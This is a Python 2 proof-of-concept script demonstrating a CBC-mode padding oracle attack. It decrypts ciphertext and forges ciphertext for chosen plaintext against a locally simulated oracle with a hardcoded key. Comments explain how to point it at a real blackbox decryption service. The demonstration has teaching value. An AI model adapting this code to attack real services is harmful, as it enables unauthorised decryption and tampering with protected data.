"""
    Padding Oracle Attack POC(CBC-MODE)
    Author: axis(axis@ph4nt0m.org)
    http://hi.baidu.com/aullik5
    2011.9
    This program is based on Juliano Rizzo and Thai Duong's talk on 
    Practical Padding Oracle Attack.(http://netifera.com/research/)
    For Education Purpose Only!!!
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import sys
# https://www.dlitz.net/software/pycrypto/
from Crypto.Cipher import *
import binascii
# the key for encrypt/decrypt
# we demo the poc here, so we need the key
# in real attack, you can trigger encrypt/decrypt in a complete blackbox env
ENCKEY = 'abcdefgh'
def main(args):
  print 
  print "=== Padding Oracle Attack POC(CBC-MODE) ==="
  print "=== by axis ==="
  print "=== axis@ph4nt0m.org ==="
  print "=== 2011.9 ==="
  print 
  ########################################
  # you may config this part by yourself
  iv = '12345678'
  plain = 'aaaaaaaaaaaaaaaaX'
  plain_want = "opaas"
  # you can choose cipher: blowfish/AES/DES/DES3/CAST/ARC2 
  cipher = "blowfish"
  ########################################
  block_size = 8
  if cipher.lower() == "aes":
    block_size = 16
  if len(iv) != block_size:
    print "[-] IV must be "+str(block_size)+" bytes long(the same as block_size)!"
    return False
  print "=== Generate Target Ciphertext ==="
  ciphertext = encrypt(plain, iv, cipher)
  if not ciphertext:
    print "[-] Encrypt Error!"
    return False
  print "[+] plaintext is: "+plain
  print "[+] iv is: "+hex_s(iv)
  print "[+] ciphertext is: "+ hex_s(ciphertext)
  print
  print "=== Start Padding Oracle Decrypt ==="
  print
  print "[+] Choosing Cipher: "+cipher.upper()
  guess = padding_oracle_decrypt(cipher, ciphertext, iv, block_size)
  if guess:
    print "[+] Guess intermediary value is: "+hex_s(guess["intermediary"])
    print "[+] plaintext = intermediary_value XOR original_IV"
    print "[+] Guess plaintext is: "+guess["plaintext"]
    print
    if plain_want:
      print "=== Start Padding Oracle Encrypt ==="
      print "[+] plaintext want to encrypt is: "+plain_want
      print "[+] Choosing Cipher: "+cipher.upper()
      en = padding_oracle_encrypt(cipher, ciphertext, plain_want, iv, block_size)
      if en:
        print "[+] Encrypt Success!"
        print "[+] The ciphertext you want is: "+hex_s(en[block_size:])
        print "[+] IV is: "+hex_s(en[:block_size])
        print
       
        print "=== Let's verify the custom encrypt result ==="
        print "[+] Decrypt of ciphertext '"+ hex_s(en[block_size:]) +"' is:"
        de = decrypt(en[block_size:], en[:block_size], cipher)
        if de == add_PKCS5_padding(plain_want, block_size):
          print de
          print "[+] Bingo!"
        else:
          print "[-] It seems something wrong happened!"
          return False
    return True
  else:
    return False
def padding_oracle_encrypt(cipher, ciphertext, plaintext, iv, block_size=8):
  # the last block
  guess_cipher = ciphertext[0-block_size:] 
  plaintext = add_PKCS5_padding(plaintext, block_size)
  print "[*] After padding, plaintext becomes to: "+hex_s(plaintext)
  print
  block = len(plaintext)
  iv_nouse = iv # no use here, in fact we only need intermediary
  prev_cipher = ciphertext[0-block_size:] # init with the last cipher block
  while block > 0:
    # we need the intermediary value
    tmp = padding_oracle_decrypt_block(cipher, prev_cipher, iv_nouse, block_size, debug=False)
    # calculate the iv, the iv is the ciphertext of the previous block
    prev_cipher = xor_str( plaintext[block-block_size:block], tmp["intermediary"] )
    #save result
    guess_cipher = prev_cipher + guess_cipher
    block = block - block_size
  return guess_cipher  
def padding_oracle_decrypt(cipher, ciphertext, iv, block_size=8, debug=True):
  # split cipher into blocks; we will manipulate ciphertext block by block
  cipher_block = split_cipher_block(ciphertext, block_size)
  if cipher_block:
    result = {}
    result["intermediary"] = ''
    result["plaintext"] = ''
    counter = 0
    for c in cipher_block:
      if debug:
        print "[*] Now try to decrypt block "+str(counter)
        print "[*] Block "+str(counter)+"'s ciphertext is: "+hex_s(c)
        print
      # padding oracle to each block
      guess = padding_oracle_decrypt_block(cipher, c, iv, block_size, debug)
      if guess:
        iv = c
        result["intermediary"] += guess["intermediary"]
        result["plaintext"] += guess["plaintext"]
        if debug:
          print
          print "[+] Block "+str(counter)+" decrypt!"
          print "[+] intermediary value is: "+hex_s(guess["intermediary"])
          print "[+] The plaintext of block "+str(counter)+" is: "+guess["plaintext"]
          print
        counter = counter+1
      else:
        print "[-] padding oracle decrypt error!"
        return False
    return result
  else:
    print "[-] ciphertext's block_size is incorrect!"    
    return False
def padding_oracle_decrypt_block(cipher, ciphertext, iv, block_size=8, debug=True):
  result = {}
  plain = ''
  intermediary = []  # list to save intermediary
  iv_p = [] # list to save the iv we found
  for i in range(1, block_size+1):
    iv_try = []
    iv_p = change_iv(iv_p, intermediary, i)
    # construct iv
    # iv = \x00...(several 0 bytes) + \x0e(the bruteforce byte) + \xdc...(the iv bytes we found)
    for k in range(0, block_size-i):
      iv_try.append("\x00")
    # bruteforce iv byte for padding oracle
    # 1 bytes to bruteforce, then append the rest bytes
    iv_try.append("\x00")
    for b in range(0,256):
      iv_tmp = iv_try
      iv_tmp[len(iv_tmp)-1] = chr(b)
    
      iv_tmp_s = ''.join("%s" % ch for ch in iv_tmp)
      # append the result of iv, we've just calculate it, saved in iv_p
      for p in range(0,len(iv_p)):
        iv_tmp_s += iv_p[len(iv_p)-1-p]
      
      # in real attack, you have to replace this part to trigger the decrypt program
      #print hex_s(iv_tmp_s) # for debug
      plain = decrypt(ciphertext, iv_tmp_s, cipher)
      #print hex_s(plain) # for debug
      # got it!
      # in real attack, you have to replace this part to the padding error judgement
      if check_PKCS5_padding(plain, i):
        if debug:
          print "[*] Try IV: "+hex_s(iv_tmp_s)
          print "[*] Found padding oracle: " + hex_s(plain)
        iv_p.append(chr(b))
        intermediary.append(chr(b ^ i))
        
        break
  plain = ''
  for ch in range(0, len(intermediary)):
    plain += chr( ord(intermediary[len(intermediary)-1-ch]) ^ ord(iv[ch]) )
    
  result["plaintext"] = plain
  result["intermediary"] = ''.join("%s" % ch for ch in intermediary)[::-1]
  return result
# save the iv bytes found by padding oracle into a list
def change_iv(iv_p, intermediary, p):
  for i in range(0, len(iv_p)):
    iv_p[i] = chr( ord(intermediary[i]) ^ p)
  return iv_p  
def split_cipher_block(ciphertext, block_size=8):
  if len(ciphertext) % block_size != 0:
    return False
  result = []
  length = 0
  while length < len(ciphertext):
    result.append(ciphertext[length:length+block_size])
    length += block_size
  return result
def check_PKCS5_padding(plain, p):
  if len(plain) % 8 != 0:
    return False
  # convert the string
  plain = plain[::-1]
  ch = 0
  found = 0
  while ch < p:
    if plain[ch] == chr(p):
      found += 1
    ch += 1 
  if found == p:
    return True
  else:
    return False
def add_PKCS5_padding(plaintext, block_size):
  s = ''
  if len(plaintext) % block_size == 0:
    return plaintext
  if len(plaintext) < block_size:
    padding = block_size - len(plaintext)
  else:
    padding = block_size - (len(plaintext) % block_size)
  
  for i in range(0, padding):
    plaintext += chr(padding)
  return plaintext
def decrypt(ciphertext, iv, cipher):
  # we only need the padding error itself, not the key
  # you may gain padding error info in other ways
  # in real attack, you may trigger decrypt program
  # a complete blackbox environment
  key = ENCKEY
  if cipher.lower() == "des":
    o = DES.new(key, DES.MODE_CBC,iv)
  elif cipher.lower() == "aes":
    o = AES.new(key, AES.MODE_CBC,iv)
  elif cipher.lower() == "des3":
    o = DES3.new(key, DES3.MODE_CBC,iv)
  elif cipher.lower() == "blowfish":
    o = Blowfish.new(key, Blowfish.MODE_CBC,iv)
  elif cipher.lower() == "cast":
    o = CAST.new(key, CAST.MODE_CBC,iv)
  elif cipher.lower() == "arc2":
    o = ARC2.new(key, ARC2.MODE_CBC,iv)
  else:
    return False
  if len(iv) % 8 != 0:
    return False
  if len(ciphertext) % 8 != 0:
    return False
  return o.decrypt(ciphertext)
def encrypt(plaintext, iv, cipher):
  key = ENCKEY
  if cipher.lower() == "des":
    if len(key) != 8:
      print "[-] DES key must be 8 bytes long!"
      return False
    o = DES.new(key, DES.MODE_CBC,iv)
  elif cipher.lower() == "aes":
    if len(key) != 16 and len(key) != 24 and len(key) != 32:
      print "[-] AES key must be 16/24/32 bytes long!"
      return False
    o = AES.new(key, AES.MODE_CBC,iv)
  elif cipher.lower() == "des3":
    if len(key) != 16:
      print "[-] Triple DES key must be 16 bytes long!"
      return False
    o = DES3.new(key, DES3.MODE_CBC,iv)
  elif cipher.lower() == "blowfish":
    o = Blowfish.new(key, Blowfish.MODE_CBC,iv)
  elif cipher.lower() == "cast":
    o = CAST.new(key, CAST.MODE_CBC,iv)
  elif cipher.lower() == "arc2":
    o = ARC2.new(key, ARC2.MODE_CBC,iv)
  else:
    return False
  plaintext = add_PKCS5_padding(plaintext, len(iv))  
  return o.encrypt(plaintext)
def xor_str(a,b):
  if len(a) != len(b):
    return False
  c = ''
  for i in range(0, len(a)):
    c += chr( ord(a[i]) ^ ord(b[i]) )
  return c
def hex_s(str):
  re = ''
  for i in range(0,len(str)):
    re += "\\x"+binascii.b2a_hex(str[i])
  return re
if __name__ == "__main__":
        main(sys.argv)